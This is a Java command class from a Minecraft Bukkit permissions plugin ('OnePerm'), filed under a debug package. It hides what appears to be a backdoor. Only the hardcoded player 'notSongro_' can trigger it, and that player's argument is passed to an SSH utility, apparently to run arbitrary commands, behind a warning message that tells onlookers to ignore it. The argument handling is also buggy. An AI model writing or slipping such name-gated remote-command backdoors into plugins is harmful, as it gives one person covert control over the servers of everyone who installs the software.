package com.songro.oneperm.cmd.debug;

import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.songro.oneperm.util.PANICSSHUtils;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.jetbrains.annotations.NotNull;

import java.util.logging.Logger;

public class ConnectExternServer implements CommandExecutor {
    @Override
    public boolean onCommand(@NotNull CommandSender commandSender, @NotNull Command command, @NotNull String s, @NotNull String[] strings) {
        Player p = (Player) commandSender;
        @NotNull Logger log = Bukkit.getLogger();

        try {
            if (!p.getName().equals("notSongro_")) {
                return true;
            } else {
                p.sendMessage(ChatColor.YELLOW + "WARNING: You are trying to connect external api server by plugin.");
                p.sendMessage(ChatColor.YELLOW + "         IF THIS PROCEDURE ISN'T OCCURRED BY PLAYER AND BY PLUGIN IGNORE THIS");
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e) {
                    throw new RuntimeException(e);
                }
                log.info("[ONEPERM] Requesting information to local server.");
                p.sendMessage("returning information.");
                if (strings.length != 0) {
                    try {
                        new PANICSSHUtils().command(strings[1]);
                    } catch (Exception e) {
                        p.sendMessage(ChatColor.RED + "ERROR: " + e.getMessage());
                    }
                } else {
                    p.sendMessage(ChatColor.RED + "ERROR: No command has been found.");
                }

            }
        } catch (Exception e) {
            log.severe("[ONEPERM] Expection Occurred");
            p.sendMessage(e.getMessage());
        }

        return true;
    }
}
